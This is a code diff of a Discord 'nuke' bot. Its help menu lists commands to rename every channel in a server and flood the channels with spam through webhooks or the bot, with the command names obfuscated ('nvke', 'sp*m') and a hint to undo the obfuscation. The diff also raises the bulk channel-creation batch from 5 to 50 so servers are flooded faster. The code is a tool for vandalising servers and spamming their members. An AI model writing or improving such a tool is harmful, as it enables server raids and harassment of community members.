@@ -72,7 +72,7 @@ async def run_bot_spam(channel, message, ping_count):
 @bot.command(name="help")
 async def help_command(ctx):
     help_text = (
-        "> **Available Commands:**\n\n"
+        "> **Available Commands: (replace v with u)**\n\n"
         "> `,help` - Displays this breakdown menu\n"
         "> `,nvke1` - Rename all channels and use webhooks to sp*m them\n"
         "> `,nvke2` - Rename all channels and use the bot to sp*m them\n"
@@ -163,7 +163,7 @@ async def nuke6(ctx):
     created_count = 0
     while created_count < target_channels:
 
-        batch_size = min(5, target_channels - created_count)
+        batch_size = min(50, target_channels - created_count)
         creation_tasks = [guild.create_text_channel(cfg["channel-name"]) for _ in range(batch_size)]
         results = await asyncio.gather(*creation_tasks, return_exceptions=True)
         valid_channels = [ch for ch in results if isinstance(ch, discord.TextChannel)]
